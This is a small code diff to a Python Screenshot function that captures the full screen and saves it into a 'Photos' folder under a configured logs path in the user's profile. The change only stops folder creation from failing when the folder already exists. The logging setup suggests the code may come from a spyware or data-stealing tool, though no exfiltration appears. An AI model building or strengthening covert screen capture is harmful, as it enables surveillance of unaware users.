@@ -7,7 +7,7 @@ def Screenshot():
     try:
         user = environ['USERPROFILE']
         screen = ImageGrab.grab()
-        makedirs(f'{user}\\{config.pathToLogs}\\Photos')
+        makedirs(f'{user}\\{config.pathToLogs}\\Photos', exist_ok=True)
         screen.save(f'{user}\\{config.pathToLogs}\\Photos\\sreenshot.jpg')
     except Exception as e:
         Log(f"Screenshot ---> {e}")
